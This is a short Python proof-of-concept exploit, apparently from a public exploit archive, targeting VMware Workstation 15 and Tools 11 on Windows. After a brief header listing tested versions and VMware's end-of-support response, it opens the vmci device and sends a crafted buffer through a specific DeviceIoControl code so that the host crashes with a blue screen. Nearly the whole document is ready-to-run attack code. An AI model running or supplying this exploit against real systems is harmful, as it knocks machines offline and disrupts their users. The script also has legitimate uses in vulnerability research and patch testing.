#
# Exploit Author: bzyo
# Twitter: @bzyo_
# Exploit Title: VMware Workstation 15/Tools 11 Denial of Service
#
# Expected Result: Will cause BSOD on any Windows version running workstation or tools
# Tested on: VMware Workstation 15.5.7 / vsock.sys 9.8.16.0
# Tested on: VMware Tools 11.0.1 / vsock.sys 9.8.16.0
#
# VMware Response: As 15.x reached end of general support, no new versions of 15.x will be shipped. 
# 

import struct
import sys
import os
import ctypes
from ctypes import *
from subprocess import *
 
kernel32 = windll.kernel32

raw_input("[+] Press ENTER to trigger the vulnerability")

handle = kernel32.CreateFileA(
    "\\\\.\\vmci",                      # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)


inbuf = "\x46\xfA\x40" + "\x41"*5 + "\x00\x00\x00\x00" + "\x42"*3 + "\x00\x01\x00\x00\x00\xff\xff\xff\xff\xff\xa8\xfc\xe0\x80\xff\xff\xff\xff"
inbuflen = 1572
outbuf = "\x00"
outbuflen = 1572

kernel32.DeviceIoControl(
    handle,             # Device
    0x8103208c,         # dwIoControlCode
    inbuf,              # lpInBuffer		
    inbuflen,           # nInBufferSize
    outbuf,             # lpOutBuffer
    outbuflen,          # nOutBufferSize
    byref(c_ulong()),   # lpBytesReturned
    None                # lpOverlapped
)
